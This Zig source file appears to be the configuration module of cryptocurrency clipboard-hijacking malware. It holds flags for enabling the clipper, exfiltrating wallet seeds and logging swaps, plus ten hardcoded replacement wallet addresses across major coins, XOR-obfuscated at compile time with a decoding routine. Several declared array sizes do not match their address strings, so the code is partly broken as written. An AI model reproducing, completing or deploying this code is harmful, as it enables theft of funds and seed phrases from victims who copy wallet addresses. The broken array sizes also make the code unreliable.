const std = @import("std");

pub const SEED: u32 = 0x61472f96;

pub const XOR_KEY: [16]u8 = .{ 0xbf, 0xcd, 0x2f, 0x77, 0xdf, 0xd9, 0xb9, 0xf9, 0x58, 0xf7, 0x0b, 0xa4, 0x49, 0xab, 0xad, 0x3b };

fn xorEncode(comptime s: []const u8) [s.len]u8 {
    var buf: [s.len]u8 = undefined;
    inline for (s, 0..) |c, i| {
        buf[i] = c ^ XOR_KEY[i % 16];
    }
    return buf;
}

fn xorDecode(enc: []const u8, out: []u8) void {
    for (enc, 0..) |c, i| {
        if (i < out.len) out[i] = c ^ XOR_KEY[i % 16];
    }
}

pub const CLIPPER_ENABLED: bool = true;
pub const CLIPPER_SEED_EXFIL: bool = true;
pub const CLIPPER_SWAP_LOG: bool = true;
pub const CLIPPER_SINGLE_USE: bool = false;
pub const CLIPPER_PRESERVE_CONTEXT: bool = true;

pub const BTC_ADDR: [48]u8 = comptime xorEncode("bc1qr8vgrcvacyea68gk6w0kdzt2xcc93azzhalyjl");
pub const ETH_ADDR: [42]u8 = comptime xorEncode("0x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67");
pub const TRX_ADDR: [34]u8 = comptime xorEncode("TBFqTqF17fRvSXDh7U8k5mVFxjqkKrWUXm");
pub const SOL_ADDR: [44]u8 = comptime xorEncode("7UQuwTTbZ9SoMY1E8D3DMyPjFCPCXjED2wcj8uhshyzW");
pub const LTC_ADDR: [34]u8 = comptime xorEncode("LfhS8tpgxY59TUnjybJCYmJMHa3BeUaASQ");
pub const XMR_ADDR: [95]u8 = comptime xorEncode("48SWwQ7QUSSPhHS9zWF9V9TKyK7FZVxDd9LghKbbkkYzB3AbhyKaCozMc26siguA2b6tce6tztCTXCWgyrypBLmW7HRxs6D");
pub const DOGE_ADDR: [34]u8 = comptime xorEncode("DDrusqzPjEovYyFrtDV8PVZVZDFFvpGAkc");
pub const BCH_ADDR: [42]u8 = comptime xorEncode("bitcoincash:qp5c3syh4t750jwpljzdmnndddlj7zg64gjhxgm8nd");
pub const XRP_ADDR: [34]u8 = comptime xorEncode("rfzq3PnZAt6eFKcJ9TXHsAm2c8GuguHUc1");
pub const ADA_ADDR: [60]u8 = comptime xorEncode("addr1qytkt94c60hcg27hd9n3zgejxlha6c0v0rpaufgrvxzprkshvktt35l0ss4aw6t8zy3nydl0m4s7c7xrmcjsxcvyz8dqxlg07g");

pub fn decryptAddress(comptime enc: []const u8, out: []u8) void {
    xorDecode(&enc, out);
}
